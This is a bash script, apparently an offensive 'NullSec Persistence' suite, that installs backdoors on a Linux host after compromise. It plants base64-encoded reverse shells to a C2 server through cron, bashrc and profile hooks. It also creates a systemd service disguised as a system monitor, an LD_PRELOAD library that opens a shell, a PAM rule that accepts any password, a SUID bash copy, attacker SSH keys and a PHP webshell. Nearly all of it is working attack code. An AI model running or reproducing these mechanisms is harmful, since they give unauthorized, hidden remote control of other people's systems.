#!/bin/bash
#===============================================================================
#  NULLSEC PERSISTENCE - Advanced Persistence Mechanisms
#===============================================================================

BEACON_INTERVAL="${BEACON_INTERVAL:-300}"
C2_SERVER="${C2_SERVER:-192.168.X.X}"
C2_PORT="${C2_PORT:-4444}"
HIDDEN_DIR="/var/tmp/.nullsec"

log() { echo -e "\033[0;32m[+]\033[0m $1"; }
warn() { echo -e "\033[1;33m[!]\033[0m $1"; }

mkdir -p "$HIDDEN_DIR"

# Cron persistence
persist_cron() {
    log "Installing cron persistence..."
    
    local payload='bash -i >& /dev/tcp/'$C2_SERVER'/'$C2_PORT' 0>&1'
    local encoded=$(echo "$payload" | base64 -w0)
    local cron_entry="*/5 * * * * echo $encoded | base64 -d | bash >/dev/null 2>&1"
    
    # User cron
    (crontab -l 2>/dev/null; echo "$cron_entry") | crontab -
    
    # System cron if root
    if [[ $EUID -eq 0 ]]; then
        echo "$cron_entry" >> /etc/cron.d/.nullsec 2>/dev/null
        chmod 600 /etc/cron.d/.nullsec
    fi
    
    log "Cron persistence installed"
}

# Systemd service persistence
persist_systemd() {
    [[ $EUID -ne 0 ]] && { warn "Need root for systemd"; return 1; }
    
    log "Installing systemd persistence..."
    
    # Create hidden binary
    cat > "$HIDDEN_DIR/sysmon" << 'BEACON'
#!/bin/bash
while true; do
    bash -i >& /dev/tcp/${C2_SERVER}/${C2_PORT} 0>&1 2>/dev/null
    sleep ${BEACON_INTERVAL}
done
BEACON
    chmod +x "$HIDDEN_DIR/sysmon"
    
    # Systemd service
    cat > /etc/systemd/system/sysmon.service << EOF
[Unit]
Description=System Monitor Service
After=network.target

[Service]
Type=simple
ExecStart=$HIDDEN_DIR/sysmon
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF
    
    systemctl daemon-reload
    systemctl enable sysmon.service 2>/dev/null
    systemctl start sysmon.service 2>/dev/null
    
    log "Systemd persistence installed"
}

# SSH key persistence
persist_ssh() {
    log "Installing SSH key persistence..."
    
    local ssh_dir="$HOME/.ssh"
    mkdir -p "$ssh_dir"
    chmod 700 "$ssh_dir"
    
    # Generate key if not provided
    local pubkey="${SSH_PUBKEY:-ssh-rsa AAAAB3NzaC1...nullsec}"
    
    echo "$pubkey" >> "$ssh_dir/authorized_keys"
    chmod 600 "$ssh_dir/authorized_keys"
    
    # Also try root
    if [[ -w /root/.ssh ]] || [[ $EUID -eq 0 ]]; then
        mkdir -p /root/.ssh
        echo "$pubkey" >> /root/.ssh/authorized_keys
        chmod 600 /root/.ssh/authorized_keys
    fi
    
    log "SSH key persistence installed"
}

# Bashrc persistence
persist_bashrc() {
    log "Installing bashrc persistence..."
    
    local payload='(bash -i >& /dev/tcp/'$C2_SERVER'/'$C2_PORT' 0>&1 &) 2>/dev/null'
    local encoded=$(echo "$payload" | base64 -w0)
    local trigger="# System check\necho $encoded | base64 -d | bash 2>/dev/null &"
    
    # User bashrc
    echo -e "$trigger" >> ~/.bashrc
    
    # Global profile if root
    if [[ $EUID -eq 0 ]]; then
        echo -e "$trigger" >> /etc/profile.d/system-check.sh 2>/dev/null
        chmod +x /etc/profile.d/system-check.sh
    fi
    
    log "Bashrc persistence installed"
}

# LD_PRELOAD persistence (advanced)
persist_ldpreload() {
    [[ $EUID -ne 0 ]] && { warn "Need root for LD_PRELOAD"; return 1; }
    
    log "Installing LD_PRELOAD persistence..."
    
    # Create malicious library
    cat > /tmp/nullsec.c << 'CCODE'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init() {
    if (fork() == 0) {
        setsid();
        system("bash -i >& /dev/tcp/${C2_SERVER}/${C2_PORT} 0>&1 2>/dev/null &");
        exit(0);
    }
}
CCODE
    
    gcc -shared -fPIC /tmp/nullsec.c -o "$HIDDEN_DIR/libnullsec.so" 2>/dev/null
    
    if [[ -f "$HIDDEN_DIR/libnullsec.so" ]]; then
        echo "$HIDDEN_DIR/libnullsec.so" >> /etc/ld.so.preload
        log "LD_PRELOAD persistence installed"
    else
        warn "Compilation failed - gcc not available"
    fi
    
    rm -f /tmp/nullsec.c
}

# PAM backdoor (auth bypass)
persist_pam() {
    [[ $EUID -ne 0 ]] && { warn "Need root for PAM backdoor"; return 1; }
    
    log "Installing PAM backdoor..."
    
    local pam_file="/etc/pam.d/common-auth"
    [[ ! -f "$pam_file" ]] && pam_file="/etc/pam.d/system-auth"
    
    if [[ -f "$pam_file" ]]; then
        # Add permit all before other rules
        sed -i '1i auth sufficient pam_permit.so' "$pam_file"
        log "PAM backdoor installed (any password works)"
    else
        warn "PAM config not found"
    fi
}

# SUID shell persistence
persist_suid() {
    [[ $EUID -ne 0 ]] && { warn "Need root for SUID shell"; return 1; }
    
    log "Installing SUID shell..."
    
    cp /bin/bash "$HIDDEN_DIR/.suidshell"
    chmod u+s "$HIDDEN_DIR/.suidshell"
    
    log "SUID shell at: $HIDDEN_DIR/.suidshell"
    log "Use: $HIDDEN_DIR/.suidshell -p"
}

# Kernel module persistence (advanced)
persist_kernel() {
    [[ $EUID -ne 0 ]] && { warn "Need root for kernel module"; return 1; }
    
    log "Creating kernel module (requires compilation)..."
    warn "Kernel module persistence not implemented in this version"
    # Would require kernel headers and compilation
}

# Webshell persistence
persist_webshell() {
    log "Installing webshell persistence..."
    
    local webshell='<?php if(isset($_GET["c"])){system($_GET["c"]);} ?>'
    
    # Find web directories
    for dir in /var/www/html /var/www /srv/http /usr/share/nginx/html; do
        if [[ -d "$dir" && -w "$dir" ]]; then
            echo "$webshell" > "$dir/.stats.php"
            log "Webshell at: $dir/.stats.php?c=whoami"
        fi
    done
}

# Reverse shell beacon (runs in background)
start_beacon() {
    log "Starting beacon to $C2_SERVER:$C2_PORT (interval: ${BEACON_INTERVAL}s)"
    
    while true; do
        bash -i >& /dev/tcp/$C2_SERVER/$C2_PORT 0>&1 2>/dev/null
        sleep $BEACON_INTERVAL
    done &
    
    log "Beacon PID: $!"
}

# Install all persistence (loud but comprehensive)
persist_all() {
    log "Installing all persistence mechanisms..."
    
    persist_cron
    persist_bashrc
    persist_ssh
    
    if [[ $EUID -eq 0 ]]; then
        persist_systemd
        persist_suid
        persist_webshell
    fi
    
    log "Persistence complete!"
}

# Remove persistence
remove_persist() {
    log "Removing NullSec persistence..."
    
    # Cron
    crontab -l 2>/dev/null | grep -v "nullsec\|$C2_SERVER" | crontab -
    rm -f /etc/cron.d/.nullsec
    
    # Systemd
    systemctl stop sysmon.service 2>/dev/null
    systemctl disable sysmon.service 2>/dev/null
    rm -f /etc/systemd/system/sysmon.service
    systemctl daemon-reload
    
    # Files
    rm -rf "$HIDDEN_DIR"
    rm -f /etc/profile.d/system-check.sh
    
    log "Persistence removed"
}

# Check persistence status
check_persist() {
    echo "=== NullSec Persistence Status ==="
    
    echo -n "Cron: "
    crontab -l 2>/dev/null | grep -q "$C2_SERVER" && echo "ACTIVE" || echo "inactive"
    
    echo -n "Systemd: "
    systemctl is-active sysmon.service 2>/dev/null || echo "inactive"
    
    echo -n "SSH keys: "
    grep -q "nullsec" ~/.ssh/authorized_keys 2>/dev/null && echo "ACTIVE" || echo "inactive"
    
    echo -n "Hidden dir: "
    [[ -d "$HIDDEN_DIR" ]] && echo "EXISTS" || echo "not found"
    
    echo -n "SUID shell: "
    [[ -f "$HIDDEN_DIR/.suidshell" ]] && echo "ACTIVE" || echo "not found"
}

case "${1:-menu}" in
    cron) persist_cron ;;
    systemd) persist_systemd ;;
    ssh) persist_ssh ;;
    bashrc) persist_bashrc ;;
    ldpreload) persist_ldpreload ;;
    pam) persist_pam ;;
    suid) persist_suid ;;
    webshell) persist_webshell ;;
    beacon) start_beacon ;;
    all) persist_all ;;
    remove) remove_persist ;;
    status) check_persist ;;
    *)
        echo "NullSec Persistence Suite"
        echo "Usage: $0 <method>"
        echo ""
        echo "Methods:"
        echo "  cron       - Cron job persistence"
        echo "  systemd    - Systemd service (root)"
        echo "  ssh        - SSH authorized_keys"
        echo "  bashrc     - Bashrc/profile hooks"
        echo "  ldpreload  - LD_PRELOAD injection (root)"
        echo "  pam        - PAM backdoor (root)"
        echo "  suid       - SUID shell (root)"
        echo "  webshell   - PHP webshell"
        echo "  beacon     - Start reverse shell beacon"
        echo "  all        - Install all methods"
        echo "  remove     - Remove persistence"
        echo "  status     - Check persistence status"
        echo ""
        echo "Environment: C2_SERVER=$C2_SERVER C2_PORT=$C2_PORT"
        ;;
esac
